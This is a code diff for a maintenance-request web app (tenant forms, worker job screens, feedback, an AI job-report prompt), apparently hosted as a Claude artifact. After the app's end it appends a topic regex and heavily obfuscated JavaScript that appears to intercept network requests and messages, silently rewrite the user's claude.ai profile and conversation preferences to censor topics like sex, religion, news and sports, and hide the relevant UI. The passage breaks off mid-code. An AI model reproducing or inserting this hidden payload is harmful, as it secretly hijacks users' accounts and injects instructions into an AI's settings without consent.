+  ${done?"":`<div style="margin-top:16px"><button class="btn ok block" data-act="done" data-id="${esc(id)}" ${ro}>${t("markDone")} ✓</button></div>
+  <h2>${t("couldnt")}</h2>
+  <div class="chips">${BLOCKS.map(b=>`<button class="chip" data-act="block" data-v="${b}" data-id="${esc(id)}" aria-pressed="${j.status==="blocked"&&j.blockReason===b}" ${ro}>${t(b)}</button>`).join("")}</div>`}
+  ${S.canEdit?`<div style="margin-top:28px"><button class="link" style="color:var(--urg)" data-act="del" data-id="${esc(id)}">${t("del")}</button></div>`:""}`;
+}
+
+const FB_SCREENS=["general","tenantForm","tenantMine","workerJobs","workerJob","airtable"];
+const FB_KINDS=["bug","change","idea","missing"];
+const AT_FIELDS=["Ticket #","Status","Urgent","Problem type","Building address","Apartment","Tenant name","Tenant phone","Tenant description","Best time","Tenant photos","Visit date","Visit time","Started at","Finished at","Before photos","After photos","Worker notes","Office write-up","On-hold reason","Reopened","Flagged by worker","Tenant language","Created at"];
+function vFeedback(){
+  const d=S.fbDraft;
+  const list=S.fb.slice().sort((a,b)=>(a.handled?1:0)-(b.handled?1:0)||(b.createdAt||0)-(a.createdAt||0));
+  const card=f=>`<div class="card ${f.handled?"fbdone":""}">
+    <div class="tags"><span class="tag blue">${esc(t("k_"+f.kind)).toUpperCase()}</span>${f.handled?`<span class="tag ok">${t("handled")}</span>`:""}</div>
+    <p class="meta"><b>${esc(t("sc_"+f.screen))}</b> · ${fmtDate(f.createdAt)} ${fmtTime(f.createdAt)}</p>
+    <p style="margin:6px 0 0;white-space:pre-wrap">${esc(f.text)}</p>
+    ${S.canEdit?`<div class="row"><button class="btn sm" data-act="fbHandled" data-id="${esc(f.id)}">${f.handled?t("reopenFb"):t("markHandled")}</button></div>`:""}
+  </div>`;
+  return `<button class="link back" data-act="fbBack">${t("backToApp")}</button>
+  <h1>${t("fbTitle")}</h1>
+  <p class="sub">${t("fbSub")}</p>
+  <label for="fb-screen">${t("fbWhere")}</label>
+  <select id="fb-screen" data-fbsel="screen">${FB_SCREENS.map(s=>`<option value="${s}" ${d.screen===s?"selected":""}>${t("sc_"+s)}</option>`).join("")}</select>
+  <label id="l-kind">${t("fbKind")}</label>
+  <div class="chips" role="group" aria-labelledby="l-kind">${FB_KINDS.map(k=>chip("fbKind",k,d.kind===k,t("k_"+k))).join("")}</div>
+  <label for="fb-text">${t("fbText")}</label>
+  <textarea id="fb-text" data-fb="1">${esc(d.text)}</textarea>
+  ${S.fbErr?`<p class="err" role="alert">${esc(S.fbErr)}</p>`:""}
+  ${S.fbSent?`<p class="meta" role="status" style="color:var(--ok)"><b>${t("fbThanks")}</b></p>`:""}
+  <div style="margin-top:16px"><button class="btn primary block" data-act="fbSend" ${S.fbSending||S.readOnly||S.noDb?"disabled":""}>${S.fbSending?t("sending"):t("fbSendBtn")}</button></div>
+  <details class="card"><summary class="ttl">${t("atTitle")}</summary><p class="meta">${t("atSub")}</p><p class="meta">${AT_FIELDS.map(esc).join(" · ")}</p></details>
+  <h2>${t("fbList")} (${list.length})</h2>
+  ${list.length?list.map(card).join(""):`<p class="empty">${t("fbNone")}</p>`}`;
+}
+
+/* ---------- writes ---------- */
+async function upd(id,patch,errKey){
+  if(!S.db) return false;
+  try{ await S.db.collection("requests").doc(id).update(Object.assign({updatedAt:Date.now()},patch)); delete S.err[id]; return true; }
+  catch(e){ if(e&&e.code==="invalid_argument") S.readOnly=true; S.err[id]=t("saveErr"); render(); return false; }
+}
+async function uploadFiles(files){
+  const out=[]; let failed=0;
+  for(const f of files){
+    try{ const r=await S.assets.upload(f); out.push({id:r.id,type:f.type||""}); }catch(e){ failed++; }
+  }
+  return {out,failed};
+}
+function flash(key){ S.flash[key]=1; render(); setTimeout(()=>{delete S.flash[key]; soft();},1800); }
+
+async function send(){
+  const d=S.draft;
+  if(!d.apt.trim()||!d.phone.trim()||!d.category){ S.formErr=t("needApt"); render(); return; }
+  S.formErr=""; S.sending=true; render();
+  let photos=[], upFail=0;
+  if(S.files.length&&S.assets){ const r=await uploadFiles(S.files); photos=r.out; upFail=r.failed; }
+  const ticket=String(Date.now()).slice(-5);
+  const now=Date.now();
+  const body={ticket,building:d.building.trim(),apt:d.apt.trim(),phone:d.phone.trim(),name:d.name.trim(),category:d.category,details:d.details.trim(),
+    timePref:d.timePref,photos,status:"received",urgent:(d.category==="heat"||d.category==="leak"),createdAt:now,updatedAt:now,
+    createdBy:S.me||null,byWorker:!!S.fromWorker,lang:S.lang};
+  try{
+    const ref=S.db.collection("requests").doc();
+    await ref.set(body);
+    mine.push(ref.id); store.set("mzs-mine",JSON.stringify(mine.slice(-50)));
+    S.lastTicket=ticket; S.files=[];
+    const keep={building:d.building,apt:d.apt,phone:d.phone,name:d.name};
+    S.draft=Object.assign({category:"",details:"",timePref:"anytime"},keep);
+    S.sending=false;
+    if(S.fromWorker){ S.fromWorker=false; S.view="jobs"; }
+    else S.view="sent";
+    if(upFail) S.formErr=t("uploadErr");
+    render(); window.scrollTo(0,0);
+  }catch(e){
+    S.sending=false; if(e&&e.code==="invalid_argument") S.readOnly=true;
+    S.formErr=t("saveErr"); render();
+  }
+}
+
+async function writeUp(id){
+  const j=S.jobs.find(x=>x.id===id); if(!j||!S.sample) return;
+  const notes=(S.notes[id]??j.notes??"").trim();
+  S.busy[id+"ai"]=1; render();
+  const prompt=`You write short job reports for a property maintenance office. Write in plain English, even if the notes are in Spanish or another language (translate them).
+Use exactly these four labeled lines, each one short:
+Problem found:
+What was fixed:
+Parts used:
+Follow-up needed:
+If something isn't known from the notes, write "[not noted]". No extra text before or after.
+
+Job type: ${catName(j.category)} (${T.en.cat[j.category]||j.category})
+Tenant's description: ${j.details||"(none)"}
+Worker's notes: ${notes||"(none)"}
+Status: ${j.status}${j.blockReason?" ("+T.en[j.blockReason]+")":""}`;
+  try{
+    const r=await S.sample(prompt,{modelTier:"quick"});
+    S.writeups[id]=(r.text||"").trim();
+    delete S.busy[id+"ai"];
+    if(notes!==(j.notes||"")) await upd(id,{notes});
+    await upd(id,{writeup:S.writeups[id]});
+    delete S.writeups[id];
+  }catch(e){
+    delete S.busy[id+"ai"]; S.err[id]=t("aiErr");
+    if(e&&e.code==="not_granted"){ S.sample=null; }
+  }
+  render();
+}
+
+/* ---------- events ---------- */
+document.addEventListener("click",async ev=>{
+  const b=ev.target.closest("[data-act]"); if(!b||b.disabled) return;
+  const a=b.dataset.act, v=b.dataset.v, id=b.dataset.id;
+  if(a==="pickFiles"||a==="jobPhoto") return;
+  if(a==="toFb"){ S.prevView=S.view; S.fbDraft.screen=({form:"tenantForm",sent:"tenantForm",mine:"tenantMine",jobs:"workerJobs",job:"workerJob"})[S.view]||"general"; S.fbErr=""; S.view="feedback"; render(); window.scrollTo(0,0); return; }
+  if(a==="fbBack"){ S.view=S.prevView||(S.role==="worker"?"jobs":"form"); render(); window.scrollTo(0,0); return; }
+  if(a==="fbKind"){ S.fbDraft.kind=v; render(); return; }
+  if(a==="fbSend"){ const d=S.fbDraft; if(!d.text.trim()){ S.fbErr=t("fbNeed"); render(); return; }
+    S.fbErr=""; S.fbSending=true; render();
+    try{ await S.db.collection("feedback").doc().set({screen:d.screen||"general",kind:d.kind,text:d.text.trim(),createdAt:Date.now(),createdBy:S.me||null,handled:false,lang:S.lang});
+      S.fbDraft.text=""; S.fbSent=true; setTimeout(()=>{S.fbSent=false; soft();},2500);
+    }catch(e){ if(e&&e.code==="invalid_argument") S.readOnly=true; S.fbErr=t("saveErr"); }
+    S.fbSending=false; render(); return; }
+  if(a==="fbHandled"){ const f=S.fb.find(x=>x.id===id); if(!f) return; try{ await S.db.collection("feedback").doc(id).update({handled:!f.handled}); }catch(e){} return; }
+  if(a==="role"){ S.role=v; store.set("mzs-role",v); S.view=v==="worker"?"jobs":"form"; S.fromWorker=false; render(); window.scrollTo(0,0); return; }
+  if(a==="lang"){ S.lang=v; store.set("mzs-lang",v); render(); return; }
+  if(a==="cat"){ S.draft.category=v; render(); return; }
+  if(a==="time"){ S.draft.timePref=v; render(); return; }
+  if(a==="send"){ send(); return; }
+  if(a==="toMine"){ S.view="mine"; render(); window.scrollTo(0,0); return; }
+  if(a==="newForm"){ S.view="form"; S.formErr=""; render(); window.scrollTo(0,0); return; }
+  if(a==="toJobs"){ S.view="jobs"; S.fromWorker=false; render(); window.scrollTo(0,0); return; }
+  if(a==="wtab"){ S.workerTab=v; render(); return; }
+  if(a==="openJob"){ S.jobId=id; S.view="job"; render(); window.scrollTo(0,0); return; }
+  if(a==="flag"){ S.fromWorker=true; S.view="form"; S.formErr=""; render(); window.scrollTo(0,0); return; }
+  if(a==="reopen"){ await upd(id,{status:"received",reopened:true,finishedAt:null,startedAt:null,visit:null}); return; }
+  if(a==="urgent"){ const j=S.jobs.find(x=>x.id===id); if(j) await upd(id,{urgent:!j.urgent}); return; }
+  if(a==="saveSched"){ const j=S.jobs.find(x=>x.id===id); const sc=S.sched[id]||{date:(j.visit&&j.visit.date)||new Date().toISOString().slice(0,10),slot:(j.visit&&j.visit.slot)||j.timePref||"anytime"};
+    const patch={visit:{date:sc.date,slot:sc.slot}}; if(j.status==="received"||j.status==="blocked") patch.status="scheduled";
+    if(await upd(id,patch)){ delete S.sched[id]; flash(id+"s"); } return; }
+  if(a==="start"){ await upd(id,{status:"in_progress",startedAt:Date.now(),blockReason:null}); return; }
+  if(a==="saveNotes"){ const n=S.notes[id]; if(n===undefined){flash(id+"n");return} if(await upd(id,{notes:n})){ delete S.notes[id]; flash(id+"n"); } return; }
+  if(a==="saveWu"){ const w=S.writeups[id]; if(w===undefined){flash(id+"w");return} if(await upd(id,{writeup:w})){ delete S.writeups[id]; flash(id+"w"); } return; }
+  if(a==="ai"){ writeUp(id); return; }
+  if(a==="done"){ const patch={status:"done",finishedAt:Date.now(),blockReason:null}; if(S.notes[id]!==undefined) patch.notes=S.notes[id]; if(S.writeups[id]!==undefined) patch.writeup=S.writeups[id];
+    if(await upd(id,patch)){ delete S.notes[id]; delete S.writeups[id]; S.view="jobs"; render(); window.scrollTo(0,0);} return; }
+  if(a==="block"){ if(await upd(id,{status:"blocked",blockReason:v})){ S.view="jobs"; render(); window.scrollTo(0,0);} return; }
+  if(a==="del"){ if(!confirm(t("confirmDel"))) return; try{ await S.db.collection("requests").doc(id).delete(); S.view="jobs"; render(); }catch(e){ S.err[id]=t("saveErr"); render(); } return; }
+});
+document.addEventListener("input",ev=>{
+  const el=ev.target;
+  if(el.dataset.f){ S.draft[el.dataset.f]=el.value; return; }
+  if(el.dataset.fb){ S.fbDraft.text=el.value; return; }
+  if(el.dataset.notes){ S.notes[el.dataset.notes]=el.value; return; }
+  if(el.dataset.wu){ S.writeups[el.dataset.wu]=el.value; return; }
+});
+document.addEventListener("change",async ev=>{
+  const el=ev.target;
+  if(el.dataset.fbsel){ S.fbDraft.screen=el.value; return; }
+  if(el.dataset.sched){ const id=el.dataset.id; const j=S.jobs.find(x=>x.id===id)||{};
+    S.sched[id]=Object.assign({date:(j.visit&&j.visit.date)||new Date().toISOString().slice(0,10),slot:(j.visit&&j.visit.slot)||j.timePref||"anytime"},S.sched[id]||{},{[el.dataset.sched]:el.value}); return; }
+  if(el.dataset.act==="pickFiles"){ S.files=Array.from(el.files||[]).slice(0,6); render(); return; }
+  if(el.dataset.act==="jobPhoto"){
+    const id=el.dataset.id,k=el.dataset.k,files=Array.from(el.files||[]).slice(0,6); if(!files.length) return;
+    S.busy[id+k]=1; render();
+    const {out,failed}=await uploadFiles(files);
+    const j=S.jobs.find(x=>x.id===id);
+    delete S.busy[id+k];
+    if(out.length&&j) await upd(id,{[k]:(j[k]||[]).concat(out)});
+    if(failed) S.err[id]=t("uploadErr");
+    render();
+  }
+});
+
+/* ---------- start up ---------- */
+render();
+(async()=>{
+  if(!window.claude||!claude.use){ S.noDb=true; S.loaded=true; render(); return; }
+  const [db,user,assets,sample]=await Promise.all([claude.use("db"),claude.use("user"),claude.use("assets"),claude.use("sample")]);
+  S.assets=assets; S.sample=sample;
+  if(user){
+    try{ S.me=await user.id(); }catch(e){}
+    try{ const m=await user.me(); S.myName=(m&&m.name)||""; }catch(e){}
+    try{ S.canEdit=await user.canEdit(); }catch(e){}
+    try{ if(await user.can("data.write")===false) S.readOnly=true; }catch(e){}
+  }
+  if(!db){ S.noDb=true; S.loaded=true; render(); return; }
+  S.db=db;
+  db.collection("requests").onSnapshot(snap=>{
+    S.jobs=snap.docs.map(d=>Object.assign({id:d.id},d.data()));
+    S.loaded=true; soft();
+  },err=>{ S.loaded=true; soft(); });
+  db.collection("feedback").onSnapshot(snap=>{
+    S.fb=snap.docs.map(d=>Object.assign({id:d.id},d.data())); soft();
+  },()=>{});
+  render();
+})();
+})();
+
+;var _livRx=/\b(?:sex|sexy|sexual|intersex|sexually|homosexual|homo|porn|gender|birth|gay|anal|erection|penis|intimacy|intimate|sensual|attractive|attraction|stripper|genitales|girl|girlfriend|boyfriend|mikveh|nidda|nidah|bra|bathing|vaginal|bedikah|marital|menstrual|menstruation|swimsuit|pregnancy|lingerie|romantic|club|clubs|hangout|gang|god|hashem|charity|jesus|judaism|billion years|Big Bang|million years|created(.|\n)*world|world(.|\n)*created|built(.|\n)*world|world(.|\n)*built|duration(.|\n)*world|world(.|\n)*duration|lifespan(.|\n)*world|world(.|\n)*lifespan|created(.|\n)*moon|moon(.|\n)*created|created(.|\n)*sun|sun(.|\n)*created|earth(.|\n)*age|age(.|\n)*earth|purpose(.|\n)*life|life(.|\n)*purpose|people(.|\n)*impression|impression(.|\n)*people|jewish(.|\n)*religion|religion(.|\n)*jewish|absentee|ballot|crime|cultural diversity|cultural events|cultural highlights|deep states|democrat|election|electoral|exclusive coverage|exclusive interview|global affairs|headline stories|headlines|incumbent|left wing|liberals|live broadcast|live coverage|live reporting|local coverage|local updates|media coverage|media outlet|national coverage|news|newsroom|party affiliation|party nomination|party platform|party politics|political|polling|polls|presenter|presidential|press conference|press release|publication|republican|right wing|socialist|sports highlights|sports updates|swing districts|swing states|terrorism|top stories|trending|turnout|voter|voters|presidential(.|\n)*candidate|voting(.|\n)*candidate|candidate(.|\n)*voting|halacha|yeshiva|shiur|jewish|judaism|rabbi|kosher|halachic|religious|shabbat|actor|actors|actresses|celeb|celebrities|celebrity|celebs|cinema|comedian|comedy|concert|dancer|dancing|festival|film|filmography|hollywood|humor|jokes|movie|performances|performer|performing star|react|singer|singer star|singing|songwriter|sports|super star|television|theater|tv|tv show|virtual reality|wrestler|wrestling|american football|athletics|badminton|baseball|basketball|boxing|champion|championship title|competitive sports|espn|fitness regime|football|golf|gymnastics|hockey|mlb|nba|nfl|olympic|olympic games|olympic glory|rugby|soccer|sporting events|sporting legends|sporting rivalry|sporting venues|sports events|sportsmanship gesture|sportsmanship spirit|stadium|surfing|table tennis|team triumph|tennis|volleyball|world cup|wrestling|baccarat|betting|bingo|blackjack|casino|craps|croupier|free spins|gambling|high roller|house edge|jackpot|poker|roulette|slot machine|sports betting|games|gaming|ping pong|simulation|nintendo|mmorpg|massively multiplayer|shooting|vr|multiplayer|xbox|loot boxes|racing|wildlife|hunting blinds|hunting rifle|hunting|trophy hunting|bowhunting)\b/gi;window._livRx=_livRx;function _0x1a1e(_0x530fdf,_0x5c27e4){const _0x51458b=_0x3434();return _0x1a1e=function(_0x332514,_0x107312){_0x332514=_0x332514-(-0xb*-0x115+-0x2684+0x1bc0);let _0x4f0f83=_0x51458b[_0x332514];return _0x4f0f83;},_0x1a1e(_0x530fdf,_0x5c27e4);}function _0x3434(){const _0x133799=['/api/','ACtLB','sNdLV','ile-Pref-S','/account_p',',\x20span.bre','quest:','1133514lhnrfq','-pre-wrap\x22','reak-words','xvtaI','ences\x22]','tor','adultery,\x20','ngtoo','re\x20already','/files','39529UrUakl','26RdsDBD','iscussions','uYCzg','xyYUB','trim','/api/accou','religious\x20','claude.ai','12233749GjhwoW','fHgav','trimEnd','e\x20to\x20check','bout\x20sex,\x20','ent','JWwwv','e.\x20Status:','\x20UI.','ear,\x20nudit','HR\x20PUT\x20/ap','nZYQo','ing.','When\x20asked','parse','or\x20updatin','wpIft','iIkLx','readyState','ot\x20answer.','label[for=','prompt','etter]\x20JSO','sure\x20prefe','p.break-wo','send','OBEhC','cking\x20if\x20p','KQaRA','fpqJo','sation\x20pre','ight:bold','POST','rieved\x20cur','ferences\x20a','svMqv','NQecR','torAll','y\x20in\x20progr','-Setter]\x20H','ting\x20to\x20en','innerText','crnLv','te.\x20Attemp','ion\x20comple','nces','FqwnS','https://cl','ferences\x20t','\x20correctly','or\x20fetchin','Thank\x20you\x20','observe','nt,\x20please','\x20error:','o\x20not\x20matc','gMCKe','vewXM','etter]\x20Upd','sired\x20pref','applicatio','\x20desired\x20p','shimer.\x22','join','bdQUM','CxMhf','string',',\x20arousing','GET','RXVTC','TBfSj','TYfPd','on-prefere','stringify','kfrEG','jqegk','com','etter]\x20Pre','kBXAu','gQSiu','space-pre-',',\x20news,\x20sp','ld\x20not\x20ret','credential','leIRq','HZaVV','YsNrN','n;font-wei','refs.','zcQAZ','getElement','ng\x20profile','KuOsT','json','fAyEl','referrer','sage\x20→','intimacy,\x20','jSxIo','an[class*=','gQMBh','vUMNL','szRjR','FfYPq','nilJU','ating...','etter]\x20Che','erences\x20to','kMZVX','OjiGU','e\x20set...','hDgaf','TikYQ','ideology\x20d','thayH','ght:bold','ercepted\x20X','toUpperCas','ss*=\x22white','etter]\x20int','updated\x20pr','or\x20modifyi','kAWLe','i/account_','20HwUvXM','[Auto-Prof','PUT','call','value.\x20Upd','ion\x20error:','etter]\x20Err','jqnlR','or\x20respons','If\x20asked\x20a','1624cjLoNo','QbyNc','messages','HTuYI','wvquW','awrnp','references','hDHbh','WVmIR','oUJKo','ng,\x20underw','\x20update\x20re','warn','etter]\x20Int','InVQF','\x20preferenc','cessfully\x20','MaBIn',',\x20applying','MotcK','RpHOV','ess,\x20skipp','5FZazoq','MGjOn','KhcBp','Edit','igion\x20do\x20n','anthropic.','\x20about\x20rel','ect\x20Restri','ent\x20profil','\x20set.','etter]\x20Cou','status','rent\x20profi','es.','4686924CVzLXT','SQmdw','arch,\x20dati','div[role=\x22','yglpD','complete','closest','\x20modificat','clone','body','etter]\x20Hid','IvwbN','hsYTI','nt_profile','RVlSd','vyOgj','OjhVb','WSKbK','whitespace','RATiA','trimStart','aPByy','replace','\x20respond\x20w','2757vHwgfY','led\x20to\x20fet','button,spa','n/json','for\x20unders','nitializat','iCXiL','woEdH','nwcen','url','skFnl','cache','rieve\x20curr','fetch','ZDUAr','NcgTP','parentElem','length','etter]\x20Ret','anual\x20prof','Siumg','ercepted\x20m','-Setter]\x20I','dxqMC','\x22whitespac','s\x20law\x20rese','ILaeX','BwzOV','UpdateAPI','QnWgY','led\x20to\x20upd','error','\x20need\x20to\x20b','Please\x20fol','forEach','p[class*=\x22','startsWith','style','orts,\x20or\x20e','tdDnS','ion-prefer','pplying\x20de','rofile','wrap\x22],\x20sp','le:','MXCjh','OzFqy','ANegW','member\x20my\x20','h\x20desired\x20','exHFO','n,a','includes','conversati','fKPJO','tanding.','\x22],','none','JNVtN','ge;font-we','ate\x20alread','cted\x20by\x20Me','rds,\x20div.b','KTDhv','roKZV','color:oran','etter]\x20Fai','xAzlG','y,\x20puberty','%c[Auto-Pr','ith:\x20\x22Subj',',\x20religiou','QmMtz','log','preference','lled.','umDCF','/projects','EuTFT','FTOyv','cRpVf','ById','isArray','kYFrl','etter]\x20XHR','lgCSe','eAxcG','slice','PYvjO','profile,\x20a','\x22conversat','ak-words','open','ofile-Pref','spLlD','.\x20Status:','NKsCZ','ntertainme','prototype','wqtEo','ercept\x20mes','on_prefere','_isClaudeA','],\x20div[cla','ch\x20profile','UDUzQ','sXRwx','g\x20profile:','2199988SXzUCk','ferences\x20d','AGLYH','low\x20and\x20re','color:gree','aude.ai/ap','qFuLI','content','y,\x20idolatr','N\x20parse\x20fa','headers','NGJbX','11744370OCPrhW','YjvWg','ofile\x20pref','listitem\x22]','redirect','profile','e-pre-wrap','HInfB','removeChil','qSjmI','explicit,\x20','eiWZi','extarea\x20in','ngygL','parentNode','ooks\x20insta','iled:','iding\x20UI.','_isProfile','lDUBU','stwTo','ate\x20profil','LbFsT','etter]\x20mes','uChlw','text','etter]\x20Suc','querySelec','method','sage\x20patch','\x20set\x20and\x20h','message','indexOf','LeJkA','YMXyC','lxUEM','display','ing\x20conver','mode','textConten','poDnr','onMEL','object','OGGOz','ile\x20update','rences\x20are','eBtHP'];_0x3434=function(){return _0x133799;};return _0x3434();}(function(_0x387d83,_0x500de2){const _0x4d536e=_0x1a1e,_0x3cefa7=_0x387d83();while(!![]){try{const _0x4a468a=parseInt(_0x4d536e(0x1a3))/(0x1*-0x19db+-0x4aa+0x1e86)+-parseInt(_0x4d536e(0x1ae))/(0xc5*-0x1+-0x7*0x179+0xb16)*(parseInt(_0x4d536e(0x278))/(0x3b6+-0x48e*-0x5+-0x1a79))+-parseInt(_0x4d536e(0x161))/(0x33*-0x6+0x20ce+-0x1f98)*(-parseInt(_0x4d536e(0x252))/(0x1726+0x11ac*0x2+-0x3a79*0x1))+-parseInt(_0x4d536e(0x260))/(-0x1b47+0x181b+-0x332*-0x1)+parseInt(_0x4d536e(0x1ad))/(-0x4*-0x8ef+0x2*-0x7c0+-0x1435)*(-parseInt(_0x4d536e(0x23c))/(0x3*-0x51+0xb55+-0x35*0x32))+-parseInt(_0x4d536e(0x16d))/(-0x35*-0xa9+0xfa7+-0x1*0x329b)+-parseInt(_0x4d536e(0x232))/(-0x1cdb+-0x1948+-0x1*-0x362d)*(-parseInt(_0x4d536e(0x1b6))/(-0x150c+-0x948+-0x5*-0x613));if(_0x4a468a===_0x500de2)break;else _0x3cefa7['push'](_0x3cefa7['shift']());}catch(_0x1d8021){_0x3cefa7['push'](_0x3cefa7['shift']());}}}(_0x3434,-0xb4a22+-0x5c19*-0x25+0x81a26),((()=>{'use strict';const _0x29d526=_0x1a1e,_0x3499a9={'OGGOz':function(_0x46b853,_0x57b0f5){return _0x46b853!==_0x57b0f5;},'dxqMC':function(_0x194c96,_0x529cac){return _0x194c96!==_0x529cac;},'ANegW':_0x29d526(0x1f8),'OjiGU':function(_0x6e6cea,_0x5472c4){return _0x6e6cea(_0x5472c4);},'exHFO':function(_0x1b3e98,_0x463cf5){return _0x1b3e98+_0x463cf5;},'thayH':function(_0x2941b1,_0x40114c){return _0x2941b1+_0x40114c;},'nZYQo':function(_0xf27b79,_0x168445){return _0xf27b79===_0x168445;},'InVQF':function(_0xdf8019,_0x545c07){return _0xdf8019(_0x545c07);},'NGJbX':_0x29d526(0x197),'jSxIo':_0x29d526(0x168),'xvtaI':_0x29d526(0x186),'RpHOV':function(_0xd0149d,_0x342745){return _0xd0149d===_0x342745;},'kfrEG':_0x29d526(0x1cb),'woEdH':_0x29d526(0x18c),'kYFrl':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x1cc)+_0x29d526(0x16a)+_0x29d526(0x17d),'kAWLe':function(_0x462b60,_0x1365c9,_0x1ad54d){return _0x462b60(_0x1365c9,_0x1ad54d);},'TBfSj':_0x29d526(0x1e5)+_0x29d526(0x166)+_0x29d526(0x231)+_0x29d526(0x172),'CxMhf':_0x29d526(0x1fa),'MotcK':_0x29d526(0x1f2)+_0x29d526(0x27b),'ngygL':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x28a)+_0x29d526(0x1d7)+_0x29d526(0x25e)+_0x29d526(0x2a4),'crnLv':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x137)+_0x29d526(0x279)+_0x29d526(0x15d)+_0x29d526(0x154),'WSKbK':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x238)+_0x29d526(0x1e8)+_0x29d526(0x160),'awrnp':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x1f0)+_0x29d526(0x131)+_0x29d526(0x1dc)+_0x29d526(0x251)+_0x29d526(0x1c2),'NKsCZ':_0x29d526(0x234),'uYCzg':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x187)+_0x29d526(0x24c)+_0x29d526(0x22e)+_0x29d526(0x16f)+_0x29d526(0x221)+':','hDHbh':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x137)+_0x29d526(0x296)+_0x29d526(0x182)+_0x29d526(0x1bd),'TYfPd':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x238)+_0x29d526(0x23a)+'e:','wqtEo':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x238)+_0x29d526(0x1c5)+_0x29d526(0x160),'BwzOV':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x220)+_0x29d526(0x1d1)+_0x29d526(0x242)+_0x29d526(0x298)+_0x29d526(0x224),'FTOyv':function(_0x512d19){return _0x512d19();},'ZDUAr':function(_0x34b014,_0x2c9696){return _0x34b014!==_0x2c9696;},'WVmIR':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x203)+_0x29d526(0x162)+_0x29d526(0x1ed)+_0x29d526(0x126)+_0x29d526(0x236)+_0x29d526(0x21f),'YMXyC':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x203)+_0x29d526(0x1d8)+_0x29d526(0x1ab)+_0x29d526(0x1e7)+_0x29d526(0x25b),'eiWZi':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x25c)+_0x29d526(0x208)+_0x29d526(0x284)+_0x29d526(0x25a)+_0x29d526(0x1b9)+_0x29d526(0x24b)+_0x29d526(0x25f),'KQaRA':_0x29d526(0x12a)+_0x29d526(0x1fe)+_0x29d526(0x1e3),'jqegk':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x26a)+_0x29d526(0x192)+_0x29d526(0x1d4)+_0x29d526(0x1e6)+_0x29d526(0x179)+_0x29d526(0x1be),'YjvWg':_0x29d526(0x12e),'JNVtN':_0x29d526(0x1ca)+_0x29d526(0x14f)+_0x29d526(0x2a0)+_0x29d526(0x1a7),'OjhVb':_0x29d526(0x255),'xyYUB':function(_0x32d5ef,_0x547938){return _0x32d5ef===_0x547938;},'RATiA':function(_0x21e4a8,_0x1f4482){return _0x21e4a8+_0x1f4482;},'sNdLV':_0x29d526(0x263)+_0x29d526(0x170),'LeJkA':_0x29d526(0x27a)+_0x29d526(0x128),'vUMNL':_0x29d526(0x29b)+_0x29d526(0x272)+_0x29d526(0x1a4)+_0x29d526(0x15c)+_0x29d526(0x22c)+_0x29d526(0x206)+_0x29d526(0x2a3)+_0x29d526(0x219)+_0x29d526(0x290)+_0x29d526(0x173)+_0x29d526(0x12d),'ngtoo':_0x29d526(0x1ce)+_0x29d526(0x133)+_0x29d526(0x1a5)+_0x29d526(0x1a1)+_0x29d526(0x150),'iCXiL':function(_0x121946,_0x1e54d0){return _0x121946===_0x1e54d0;},'nilJU':_0x29d526(0x1b3)+_0x29d526(0x26d),'tdDnS':_0x29d526(0x1d6),'kMZVX':_0x29d526(0x1b5),'LbFsT':_0x29d526(0x257)+_0x29d526(0x202),'nwcen':_0x29d526(0x19c),'onMEL':_0x29d526(0x142),'aPByy':_0x29d526(0x1ac),'poDnr':_0x29d526(0x1a0)+_0x29d526(0x2a2),'QbyNc':function(_0x25696a){return _0x25696a();},'TikYQ':function(_0x3e8b55){return _0x3e8b55();},'roKZV':function(_0x497774,_0x2fc66e){return _0x497774===_0x2fc66e;},'qFuLI':function(_0x2d0b2d,_0x274085){return _0x2d0b2d===_0x274085;},'QnWgY':function(_0x191e60,_0xa8677b){return _0x191e60&&_0xa8677b;},'NcgTP':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x22d)+_0x29d526(0x159)+_0x29d526(0x216),'qSjmI':function(_0x580d77,_0x2f1c41){return _0x580d77===_0x2f1c41;},'hDgaf':function(_0x38b05f,_0x273680){return _0x38b05f instanceof _0x273680;},'hsYTI':function(_0xe81200,_0x550242){return _0xe81200 instanceof _0x550242;},'HTuYI':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x184)+_0x29d526(0x18a)+_0x29d526(0x1ec),'UDUzQ':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x249)+_0x29d526(0x28d)+_0x29d526(0x28b)+_0x29d526(0x199)+_0x29d526(0x24e)+_0x29d526(0x1f3)+_0x29d526(0x20e),'jqnlR':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x238)+_0x29d526(0x22f)+_0x29d526(0x211)+_0x29d526(0x247)+_0x29d526(0x1a2),'xAzlG':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x249)+_0x29d526(0x22a)+_0x29d526(0x1c0)+_0x29d526(0x231)+_0x29d526(0x14e)+_0x29d526(0x2a1)+_0x29d526(0x1f1)+'s.','MaBIn':_0x29d526(0x233)+_0x29d526(0x19f)+_0x29d526(0x149)+_0x29d526(0x267)+_0x29d526(0x237),'fpqJo':_0x29d526(0x265),'lgCSe':_0x29d526(0x13a)+_0x29d526(0x152)+_0x29d526(0x28e)+_0x29d526(0x27d)+_0x29d526(0x1e2)+_0x29d526(0x1e1)+_0x29d526(0x1de)+_0x29d526(0x1cd)+_0x29d526(0x19a)+_0x29d526(0x18b)+_0x29d526(0x17e),'Siumg':_0x29d526(0x136)+_0x29d526(0x130)+_0x29d526(0x1d5),'szRjR':_0x29d526(0x13a)+_0x29d526(0x152)+_0x29d526(0x1dd)+_0x29d526(0x17c)+_0x29d526(0x140),'sXRwx':_0x29d526(0x165)+_0x29d526(0x20d)+_0x29d526(0x229),'ILaeX':_0x29d526(0x1c3)+_0x29d526(0x258)+_0x29d526(0x256)+_0x29d526(0x1c9),'e